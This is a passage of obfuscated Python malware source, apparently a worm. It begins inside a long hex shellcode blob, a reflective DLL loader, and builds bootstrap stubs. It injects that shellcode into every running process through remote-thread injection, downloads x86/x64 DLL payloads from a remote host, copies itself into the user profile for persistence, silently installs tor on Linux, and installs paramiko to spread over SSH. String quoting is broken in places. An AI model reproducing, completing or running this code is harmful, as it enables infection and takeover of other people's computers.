68\x56\x69\x72\x74\xC7\x44\x24\x6C\x75\x61\x6C\x50\xC7\x44\x24\x70\x72\x6F\x74\x65\x66\xC7\x44\x24\x74\x63\x74\xC7\x45\xA8\x46\x6C\x75\x73\xC7\x45\xAC\x68\x49\x6E\x73\xC7\x45\xB0\x74\x72\x75\x63\xC7\x45\xB4\x74\x69\x6F\x6E\xC7\x45\xB8\x43\x61\x63\x68\xC7\x44\x24\x78\x47\x65\x74\x4E\xC7\x44\x24\x7C\x61\x74\x69\x76\xC7\x45\x80\x65\x53\x79\x73\xC7\x45\x84\x74\x65\x6D\x49\x66\xC7\x45\x88\x6E\x66\xC6\x45\x8A\x6F\xC7\x45\x90\x52\x74\x6C\x41\xC7\x45\x94\x64\x64\x46\x75\xC7\x45\x98\x6E\x63\x74\x69\xC7\x45\x9C\x6F\x6E\x54\x61\x66\xC7\x45\xA0\x62\x6C\xE8\x7F\x08\x00\x00\xB9\xB5\x41\xD9\x5E\x48\x8B\xD8\xE8\x72\x08\x00\x00\x4C\x8B\xE8\x48\x89\x45\xD0\x48\x8D\x45\xD8\xC7\x45\x20\x18\x00\x18\x00\x4C\x8D\x4C\x24\x38\x48\x89\x45\x28\x4C\x8D\x45\x20\x33\xD2\x33\xC9\xFF\xD3\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x48\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\xC8\xC7\x44\x24\x28\x0C\x00\x0C\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x68\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\x00\xC7\x44\x24\x28\x0E\x00\x0E\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8D\x45\xA8\xC7\x44\x24\x28\x15\x00\x15\x00\x48\x8B\x4C\x24\x38\x4C\x8D\x4D\x08\x45\x33\xC0\x48\x89\x44\x24\x30\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x78\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\x10\xC7\x44\x24\x28\x13\x00\x13\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x40\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\xF0\xC7\x44\x24\x28\x05\x00\x05\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x45\x90\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\x18\xC7\x44\x24\x28\x13\x00\x13\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x48\x8B\x4C\x24\x38\x48\x8D\x44\x24\x58\x45\x33\xC0\x48\x89\x44\x24\x30\x4C\x8D\x4D\xF8\xC7\x44\x24\x28\x0C\x00\x0C\x00\x48\x8D\x54\x24\x28\x41\xFF\xD5\x4C\x39\x7D\xC8\x0F\x84\x1D\x07\x00\x00\x4C\x39\x7D\x00\x0F\x84\x13\x07\x00\x00\x4C\x39\x7D\xF0\x0F\x84\x09\x07\x00\x00\x4C\x39\x7D\x08\x0F\x84\xFF\x06\x00\x00\x48\x8B\x55\x10\x48\x85\xD2\x0F\x84\xF2\x06\x00\x00\x48\x63\x7E\x3C\x48\x03\xFE\x81\x3F\x50\x45\x00\x00\x0F\x85\xDF\x06\x00\x00\xB8\x64\x86\x00\x00\x66\x39\x47\x04\x0F\x85\xD0\x06\x00\x00\x45\x8D\x4F\x01\x44\x84\x4F\x38\x0F\x85\xC2\x06\x00\x00\x0F\xB7\x4F\x14\x41\x8B\xDF\x48\x83\xC1\x24\x66\x44\x3B\x7F\x06\x73\x25\x44\x0F\xB7\x47\x06\x48\x03\xCF\x44\x39\x79\x04\x8B\x47\x38\x0F\x45\x41\x04\x03\x01\x48\x8D\x49\x28\x3B\xC3\x0F\x46\xC3\x8B\xD8\x4D\x2B\xC1\x75\xE3\x48\x8D\x4D\x38\xFF\xD2\x8B\x55\x3C\x44\x8B\xC2\x44\x8D\x72\xFF\xF7\xDA\x44\x03\x77\x50\x49\x8D\x48\xFF\x8B\xC2\x4C\x23\xF0\x8B\xC3\x48\x03\xC8\x49\x8D\x40\xFF\x48\xF7\xD0\x48\x23\xC8\x4C\x3B\xF1\x0F\x85\x54\x06\x00\x00\x48\x8B\x4F\x30\x41\xBC\x00\x30\x00\x00\x45\x8B\xC4\x41\xB9\x04\x00\x00\x00\x49\x8B\xD6\xFF\x55\xC8\x48\x8B\xD8\x48\x85\xC0\x75\x12\x44\x8D\x48\x04\x45\x8B\xC4\x49\x8B\xD6\x33\xC9\xFF\x55\xC8\x48\x8B\xD8\x44\x8B\xA5\xD0\x00\x00\x00\x41\xBB\x01\x00\x00\x00\x45\x84\xE3\x74\x1D\x8B\x46\x3C\x89\x43\x3C\x8B\x56\x3C\xEB\x0B\x8B\xCA\x41\x03\xD3\x8A\x04\x31\x88\x04\x19\x3B\x57\x54\x72\xF0\xEB\x19\x41\x8B\xD7\x44\x39\x7F\x54\x76\x10\x8B\xCA\x41\x03\xD3\x8A\x04\x31\x88\x04\x19\x3B\x57\x54\x72\xF0\x48\x63\x7B\x3C\x45\x8B\xD7\x48\x03\xFB\x48\x89\x7D\x30\x44\x0F\xB7\x47\x14\x49\x83\xC0\x28\x66\x44\x3B\x7F\x06\x73\x3A\x4C\x03\xC7\x45\x8B\xCF\x45\x39\x38\x76\x1F\x41\x8B\x50\x04\x41\x8B\x48\xFC\x41\x8B\xC1\x45\x03\xCB\x48\x03\xC8\x48\x03\xD0\x8A\x04\x32\x88\x04\x19\x45\x3B\x08\x72\xE1\x0F\xB7\x47\x06\x45\x03\xD3\x49\x83\xC0\x28\x44\x3B\xD0\x72\xC9\x4C\x8B\xF3\x41\xB8\x02\x00\x00\x00\x4C\x2B\x77\x30\x0F\x84\xD6\x00\x00\x00\x44\x39\xBF\xB4\x00\x00\x00\x0F\x84\xC9\x00\x00\x00\x44\x8B\x8F\xB0\x00\x00\x00\x4C\x03\xCB\x45\x39\x39\x0F\x84\xB6\x00\x00\x00\x4D\x8D\x51\x08\xE9\x91\x00\x00\x00\x45\x0F\xB7\x1A\x41\x0F\xB7\xCB\x41\x0F\xB7\xC3\x66\xC1\xE9\x0C\x66\x83\xF9\x0A\x75\x29\x45\x8B\x01\x41\x81\xE3\xFF\x0F\x00\x00\x4B\x8D\x04\x18\x48\x8B\x14\x18\x4B\x8D\x04\x18\x41\xBB\x01\x00\x00\x00\x49\x03\xD6\x48\x89\x14\x18\x45\x8D\x43\x01\xEB\x4F\x41\xBB\x01\x00\x00\x00\x66\x83\xF9\x03\x75\x0E\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x41\x8B\xC6\xEB\x2E\x66\x41\x3B\xCB\x75\x15\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x49\x8B\xC6\x48\xC1\xE8\x10\x0F\xB7\xC0\xEB\x13\x66\x41\x3B\xC8\x75\x14\x25\xFF\x0F\x00\x00\x48\x8D\x0C\x03\x41\x0F\xB7\xC6\x41\x8B\x11\x48\x01\x04\x0A\x4D\x03\xD0\x41\x8B\x41\x04\x49\x03\xC1\x4C\x3B\xD0\x0F\x85\x5F\xFF\xFF\xFF\x4D\x8B\xCA\x45\x39\x3A\x0F\x85\x4A\xFF\xFF\xFF\x44\x39\xBF\x94\x00\x00\x00\x0F\x84\x82\x01\x00\x00\x8B\x8F\x90\x00\x00\x00\x45\x8B\xEF\x4C\x8D\x04\x19\x49\x8D\x40\x0C\xEB\x07\x45\x03\xEB\x48\x8D\x40\x14\x44\x39\x38\x75\xF4\x41\x8B\xC4\x83\xE0\x04\x89\x45\xC0\x8B\xC1\x0F\x84\x89\x00\x00\x00\x45\x3B\xEB\x0F\x86\x80\x00\x00\x00\x41\xC1\xEC\x10\x45\x8D\x5D\xFF\x45\x8B\xD7\x45\x85\xDB\x74\x74\x4D\x8B\xC8\x41\xBE\xFF\x7F\x00\x00\x41\x0F\x10\x01\x33\xD2\x41\x8B\xCD\x41\x2B\xCA\x69\xF6\xFD\x43\x03\x00\x41\x8B\xC6\xF7\xF1\x33\xD2\x81\xC6\xC3\x9E\x26\x00\x8D\x48\x01\x8B\xC6\xC1\xE8\x10\x41\x23\xC6\xF7\xF1\x41\x03\xC2\x41\xFF\xC2\x48\x8D\x0C\x80\x41\x8B\x54\x88\x10\x41\x0F\x10\x0C\x88\x41\x0F\x11\x04\x88\x41\x8B\x41\x10\x41\x89\x44\x88\x10\x41\x0F\x11\x09\x41\x89\x51\x10\x4D\x8D\x49\x14\x45\x3B\xD3\x72\xA1\x8B\x87\x90\x00\x00\x00\xEB\x04\x44\x8B\x65\xC0\x8B\xF0\x48\x03\xF3\x8B\x46\x0C\x85\xC0\x0F\x84\xB1\x00\x00\x00\x8B\x7D\xC0\x8B\xC8\x48\x03\xCB\xFF\x55\xF8\x48\x89\x44\x24\x38\x4C\x8B\xD0\x44\x8B\x36\x44\x8B\x7E\x10\x4C\x03\xF3\x4C\x03\xFB\x49\x8B\x0E\x48\x85\xC9\x74\x5F\x48\x85\xC9\x79\x08\x45\x0F\xB7\x06\x33\xD2\xEB\x32\x48\x8D\x53\x02\x33\xC0\x48\x03\xD1\x38\x02\x74\x0E\x48\x8B\xCA\x48\xFF\xC1\x48\xFF\xC0\x80\x39\x00\x75\xF5\x48\x89\x54\x24\x30\x45\x33\xC0\x48\x8D\x54\x24\x28\x66\x89\x44\x24\x28\x66\x89\x44\x24\x2A\x4D\x8B\xCF\x49\x8B\xCA\xFF\x55\xD0\x49\x83\xC6\x08\x49\x83\xC7\x08\x49\x8B\x0E\x48\x85\xC9\x74\x07\x4C\x8B\x54\x24\x38\xEB\xA1\x45\x33\xFF\x85\xFF\x74\x10\x41\x83\xFD\x01\x76\x0A\x41\x69\xCC\xE8\x03\x00\x00\xFF\x55\xF0\x8B\x46\x20\x48\x83\xC6\x14\x85\xC0\x0F\x85\x56\xFF\xFF\xFF\x48\x8B\x7D\x30\x4C\x8B\x6D\xD0\x44\x39\xBF\xF4\x00\x00\x00\x0F\x84\xA9\x00\x00\x00\x44\x8B\xBF\xF0\x00\x00\x00\x49\x83\xC7\x04\x4C\x03\xFB\x45\x33\xE4\x41\x8B\x07\x85\xC0\x0F\x84\x8A\x00\x00\x00\x8B\xC8\x48\x03\xCB\xFF\x55\xF8\x48\x89\x44\x24\x38\x48\x8B\xC8\x41\x8B\x77\x08\x45\x8B\x77\x0C\x48\x03\xF3\x4C\x03\xF3\x4C\x39\x26\x74\x5E\x49\x8B\x16\x48\x85\xD2\x79\x08\x44\x0F\xB7\xC2\x33\xD2\xEB\x34\x4C\x8D\x43\x02\x49\x8B\xC4\x4C\x03\xC2\x45\x38\x20\x74\x0E\x49\x8B\xD0\x48\xFF\xC2\x48\xFF\xC0\x44\x38\x22\x75\xF5\x4C\x89\x44\x24\x30\x48\x8D\x54\x24\x28\x45\x33\xC0\x66\x89\x44\x24\x28\x66\x89\x44\x24\x2A\x4C\x8B\xCE\x41\xFF\xD5\x48\x83\xC6\x08\x49\x83\xC6\x08\x4C\x39\x26\x74\x07\x48\x8B\x4C\x24\x38\xEB\xA2\x49\x83\xC7\x20\xE9\x6B\xFF\xFF\xFF\x45\x33\xFF\x0F\xB7\x77\x14\x45\x8B\xF7\x48\x83\xC6\x28\x41\xBC\x01\x00\x00\x00\x66\x44\x3B\x7F\x06\x0F\x83\x0B\x01\x00\x00\x48\x03\xF7\x44\x39\x3E\x0F\x84\xEB\x00\x00\x00\x8B\x46\x14\x8B\xC8\x81\xE1\x00\x00\x00\x20\x75\x17\x0F\xBA\xE0\x1E\x72\x11\x85\xC0\x78\x0D\x45\x8B\xC4\x44\x89\x64\x24\x20\xE9\xA4\x00\x00\x00\x85\xC9\x75\x3C\x0F\xBA\xE0\x1E\x72\x0A\x85\xC0\x79\x06\x44\x8D\x41\x08\xEB\x68\x85\xC9\x75\x28\x0F\xBA\xE0\x1E\x73\x0A\x85\xC0\x78\x06\x44\x8D\x41\x02\xEB\x54\x85\xC9\x75\x14\x0F\xBA\xE0\x1E\x73\x0A\x85\xC0\x79\x06\x44\x8D\x41\x04\xEB\x40\x85\xC9\x74\x5F\x0F\xBA\xE0\x1E\x72\x0C\x85\xC0\x78\x08\x41\xB8\x10\x00\x00\x00\xEB\x2A\x85\xC9\x74\x49\x0F\xBA\xE0\x1E\x72\x0C\x85\xC0\x79\x08\x41\xB8\x80\x00\x00\x00\xEB\x14\x85\xC9\x74\x33\x0F\xBA\xE0\x1E\x73\x11\x85\xC0\x78\x0D\x41\xB8\x20\x00\x00\x00\x44\x89\x44\x24\x20\xEB\x21\x85\xC9\x74\x18\x0F\xBA\xE0\x1E\x73\x12\x44\x8B\x44\x24\x20\x85\xC0\xB9\x40\x00\x00\x00\x44\x0F\x48\xC1\xEB\xDD\x44\x8B\x44\x24\x20\xF7\x46\x14\x00\x00\x00\x04\x74\x0A\x41\x0F\xBA\xE8\x09\x44\x89\x44\x24\x20\x8B\x4E\xFC\x4C\x8D\x4C\x24\x20\x8B\x16\x48\x03\xCB\xFF\x55\x00\x0F\xB7\x47\x06\x45\x03\xF4\x48\x83\xC6\x28\x44\x3B\xF0\x0F\x82\xF8\xFE\xFF\xFF\x45\x33\xC0\x33\xD2\x48\x83\xC9\xFF\xFF\x55\x08\x44\x39\xBF\xD4\x00\x00\x00\x74\x24\x8B\x87\xD0\x00\x00\x00\x48\x8B\x74\x18\x18\xEB\x0F\x45\x33\xC0\x41\x8B\xD4\x48\x8B\xCB\xFF\xD0\x48\x8D\x76\x08\x48\x8B\x06\x48\x85\xC0\x75\xE9\x4C\x8B\x4D\x18\x4D\x85\xC9\x74\x2F\x8B\x87\xA4\x00\x00\x00\x85\xC0\x74\x25\x8B\xC8\x4C\x8B\xC3\x48\xB8\xAB\xAA\xAA\xAA\xAA\xAA\xAA\xAA\x48\xF7\xE1\x8B\x8F\xA0\x00\x00\x00\x48\xC1\xEA\x03\x48\x03\xCB\x41\x2B\xD4\x41\xFF\xD1\x8B\x47\x28\x4D\x8B\xC4\x48\x03\xC3\x41\x8B\xD4\x48\x8B\xCB\xFF\xD0\x8B\xB5\xB8\x00\x00\x00\x85\xF6\x0F\x84\x97\x00\x00\x00\x44\x39\xBF\x8C\x00\x00\x00\x0F\x84\x8A\x00\x00\x00\x8B\x8F\x88\x00\x00\x00\x48\x03\xCB\x44\x8B\x59\x18\x45\x85\xDB\x74\x78\x44\x39\x79\x14\x74\x72\x44\x8B\x49\x20\x41\x8B\xFF\x8B\x51\x24\x4C\x03\xCB\x48\x03\xD3\x45\x85\xDB\x74\x5D\x45\x8B\x01\x45\x8B\xD7\x4C\x03\xC3\x74\x52\xEB\5x0D\x0F\xBE\xC0\x44\x03\xD0\x41\xC1\xCA\x0D\x4D\x03\xC4\x41\x8A\x00\x84\xC0\x75\xEC\x41\x3B\xF2\x75\x05\x48\x85\xD2\x75\x12\x41\x03\xFC\x49\x83\xC1\x04\x48\x83\xC2\x02\x41\x3B\xFB\x73\x22\xEB\xC3\x8B\x41\x1C\x0F\xB7\x0A\x48\x03\xC3\x8B\x95\xC8\x00\x00\x00\x44\x8B\x04\x88\x48\x8B\x8D\xC0\x00\x00\x00\x4C\x03\xC3\x41\xFF\xD0\x48\x8B\xC3\xEB\x02\x33\xC0\x48\x8B\x9C\x24\xB0\x01\x00\x00\x48\x81\xC4\x70\x01\x00\x00\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x5F\x5E\x5D\xC3\xCC\x48\x8B\xC4\x48\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x56\x48\x83\xEC\x10\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x8B\xE9\x45\x33\xF6\x48\x8B\x50\x18\x4C\x8B\x4A\x10\x4D\x8B\x41\x30\x4D\x85\xC0\x0F\x84\xB3\x00\x00\x00\x41\x0F\x10\x41\x58\x49\x63\x40\x3C\x41\x8B\xD6\x4D\x8B\x09\xF3\x0F\x7F\x04\x24\x46\x8B\x9C\x00\x88\x00\x00\x00\x45\x85\xDB\x74\xD2\x48\x8B\x04\x24\x48\xC1\xE8\x10\x66\x44\x3B\xF0\x73\x22\x48\x8B\x4C\x24\x08\x44\x0F\xB7\xD0\x0F\xBE\x01\xC1\xCA\x0D\x80\x39\x61\x7C\x03\x83\xC2\xE0\x03\xD0\x48\xFF\xC1\x49\x83\xEA\x01\x75\xE7\x4F\x8D\x14\x18\x45\x8B\xDE\x41\x8B\x7A\x20\x49\x03\xF8\x45\x39\x72\x18\x76\x8E\x8B\x37\x41\x8B\xDE\x49\x03\xF0\x48\x8D\x7F\x04\x0F\xBE\x0E\x48\xFF\xC6\xC1\xCB\x0D\x03\xD9\x84\xC9\x75\xF1\x8D\x04\x13\x3B\xC5\x74\x0E\x41\xFF\xC3\x45\x3B\x5A\x18\x72\xD5\xE9\x5E\xFF\xFF\xFF\x41\x8B\x42\x24\x43\x8D\x0C\x1B\x49\x03\xC0\x0F\xB7\x14\x01\x41\x8B\x4A\x1C\x49\x03\xC8\x8B\x04\x91\x49\x03\xC0\xEB\x02\x33\xC0\x48\x8B\x5C\x24\x20\x48\x8B\x6C\x24\x28\x48\x8B\x74\x24\x30\x48\x8B\x7C\x24\x38\x48\x83\xC4\x10\x41\x5E\xC3'
    if TdxIaFdWYl(YqNWYajlacjd):
        niWhmNsi = PWYIbcNFR
        kGNLACeaglh = b''
        NqubXEJkdbz = 64
        kGNLACeaglh += b'\xe8\x00\x00\x00\x00'
        QomMiokZio = NqubXEJkdbz - len(kGNLACeaglh) + len(niWhmNsi)
        kGNLACeaglh += b'\x59'
        kGNLACeaglh += b'\x49\x89\xc8'
        kGNLACeaglh += b'\x48\x81\xc1'
        kGNLACeaglh += struct.pack('I', QomMiokZio)
        kGNLACeaglh += b'\xba'
        kGNLACeaglh += struct.pack('I', qeDoPJWPsaE)
        kGNLACeaglh += b'\x49\x81\xc0'
        npaoUIaxa = QomMiokZio + len(YqNWYajlacjd)
        kGNLACeaglh += struct.pack('I', npaoUIaxa)
        kGNLACeaglh += b'\x41\xb9'
        kGNLACeaglh += struct.pack('I', len(BEbBsaQKzvpo))
        kGNLACeaglh += b'\x56'
        kGNLACeaglh += b'\x48\x89\xe6'
        kGNLACeaglh += b'\x48\x83\xe4\xf0'
        kGNLACeaglh += b'\x48\x83\xec'
        kGNLACeaglh += b'\x30'
        kGNLACeaglh += b'\xC7\x44\x24'
        kGNLACeaglh += b'\x20'
        kGNLACeaglh += struct.pack('I', ddNSEmQRaa)
        kGNLACeaglh += b'\xe8'
        kGNLACeaglh += struct.pack('b', NqubXEJkdbz - len(kGNLACeaglh) - 4)
        kGNLACeaglh += b'\x00\x00\x00'
        kGNLACeaglh += b'\x48\x89\xf4'
        kGNLACeaglh += b'\x5e'
        kGNLACeaglh += b'\xc3'
        if len(kGNLACeaglh) != NqubXEJkdbz:
            raise Exception(x64 bootstrap length: {} != bootstrapSize: {}.format(len(kGNLACeaglh), NqubXEJkdbz))
        return kGNLACeaglh + niWhmNsi + YqNWYajlacjd + BEbBsaQKzvpo
    else:
        niWhmNsi = fafMcCKpZ
        kGNLACeaglh = b''
        NqubXEJkdbz = 49
        kGNLACeaglh += b'\xe8\x00\x00\x00\x00'
        QomMiokZio = NqubXEJkdbz - len(kGNLACeaglh) + len(niWhmNsi)
        kGNLACeaglh += b'\x58'
        kGNLACeaglh += b'\x55'
        kGNLACeaglh += b'\x89\xe5'
        kGNLACeaglh += b'\x89\xc2'
        kGNLACeaglh += b'\x05'
        kGNLACeaglh += struct.pack('I', QomMiokZio)
        kGNLACeaglh += b'\x81\xc2'
        npaoUIaxa = QomMiokZio + len(YqNWYajlacjd)
        kGNLACeaglh += struct.pack('I', npaoUIaxa)
        kGNLACeaglh += b'\x68'
        kGNLACeaglh += struct.pack('I', ddNSEmQRaa)
        kGNLACeaglh += b'\x68'
        kGNLACeaglh += struct.pack('I', len(BEbBsaQKzvpo))
        kGNLACeaglh += b'\x52'
        kGNLACeaglh += b'\x68'
        kGNLACeaglh += struct.pack('I', qeDoPJWPsaE)
        kGNLACeaglh += b'\x50'
        kGNLACeaglh += b'\xe8'
        kGNLACeaglh += struct.pack('b', NqubXEJkdbz - len(kGNLACeaglh) - 4) # Skip over the remainder of instructions
        kGNLACeaglh += b'\x00\x00\x00'
        kGNLACeaglh += b'\x83\xc4\x14'
        kGNLACeaglh += b'\xc9'
        kGNLACeaglh += b'\xc3'
        if len(kGNLACeaglh) != NqubXEJkdbz:
            return False
        return kGNLACeaglh + niWhmNsi + YqNWYajlacjd + BEbBsaQKzvpo
    return False
global qmNCgpdopWWL
qmNCgpdopWWL = 0
def SQLfLTaob(OHTldahR, TRqdkGBA):
    global qmNCgpdopWWL
    qmNCgpdopWWL += 1
    MSDPlGwXFuTb = windll.kernel32.OpenProcess(0x1F0FFF, False, OHTldahR)
    if not MSDPlGwXFuTb:
        qmNCgpdopWWL -= 1
        return
    bdnRasiaUx = windll.kernel32.VirtualAllocEx(MSDPlGwXFuTb, 0, len(TRqdkGBA), 0x00001000, 0x40)
    windll.kernel32.WriteProcessMemory(MSDPlGwXFuTb, bdnRasiaUx, TRqdkGBA, len(TRqdkGBA), 0)
    if not windll.kernel32.CreateRemoteThread(MSDPlGwXFuTb, None, 0, bdnRasiaUx, 0, 0, 0):
        qmNCgpdopWWL -= 1
        return
    qmNCgpdopWWL -= 1
def DxYGfjoOdixy(TRqdkGBA):
    while 1:
        for pid in psutil.pids():
            fDFRByLyo = CreateMutex(None, 0, str(pid) + :$6829)
            if GetLastError() == 183:
                continue
            while qmNCgpdopWWL >= 4:
                time.sleep(0.1)
            threading.Thread(target=SQLfLTaob, args=(pid,TRqdkGBA,)).start()
JIKazaacmoQ = internationalCyberWarefare
if os.name == 'nt':
    try:
        sys.argv[1]
    except IndexError:
        subprocess.Popen(GetCommandLine() + " 1", creationflags=8, close_fds=True)
        os.kill(os.getpid(),9)
    JIKazaacmoQ = CreateMutex(None, False, JIKazaacmoQ)
    if GetLastError() == ERROR_ALREADY_EXISTS:
       os.kill(os.getpid(),9)
    if os.path.abspath(sys.argv[0]).lower().endswith(.exe) and not os.path.abspath(sys.argv[0]).lower().endswith($6829.exe):
        try:
            shutil.copyfile(os.path.abspath(sys.argv[0]), os.getenv(USERPROFILE) + \$6829.exe)
            os.startfile(os.getenv(USERPROFILE) + \$6829.exe)
            os.kill(os.getpid(),9)
        except:
            pass
    else:
        try:
            shutil.copyfile(sys.executable, os.getenv(USERPROFILE) + \$6829.exe)
        except:
            pass
    try:
        if platform.architecture()[0].replace("bit","") == "32":
            TRqdkGBA=aVxhKsCWoVo(urllib2.urlopen(http:// + WMiBcGbzLiZ + /x86.dll).read())
        else:
            TRqdkGBA=aVxhKsCWoVo(urllib2.urlopen(http:// + WMiBcGbzLiZ + /x64.dll).read())
        threading.Thread(target=DxYGfjoOdixy, args=(TRqdkGBA,)).start()
    except:
        pass
else:
    ZULhPYEqJjL()
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.bind('\0' + JIKazaacmoQ) 
    except socket.error:
        os.kill(os.getpid(),9)
    os.popen(apt install tor -y > /dev/null 2>&1 &)
    os.popen(yum install tor -y > /dev/null 2>&1 &)
    os.popen(dnf install tor -y > /dev/null 2>&1 &)
def uAgxwHoUXWbk():
    global FAozAuHBacRN,ports
    try:
        import paramiko
        FAozAuHBacRN=True
    except ImportError:
        try:
            try:
                import pip
            except ImportError:
                urllib.urlretrieve(https://bootstrap.pypa   ç.io/pip/2.7/get-pip.py, get-pip.py)
                for iRTKVEkhyYC in ["", "2", "2.7"]:
                    subprocess.call([python+iRTKVEkhyYC, get-pip.py])
                os.remove(get-pip.py)
            try:
                from pip import main as pipmain
            except ImportError:
                from pip._internal import main as pipmain
            pipmain([install, paramiko])
            import paramiko
            FAozAuHBacRN=True
        except:
            pass
    if FAozAuHBacRN:
        ports.insert(0,22)
threading.Thread(target=VKgWYKnooq, args=()).start()
uAgxwHoUXWbk()
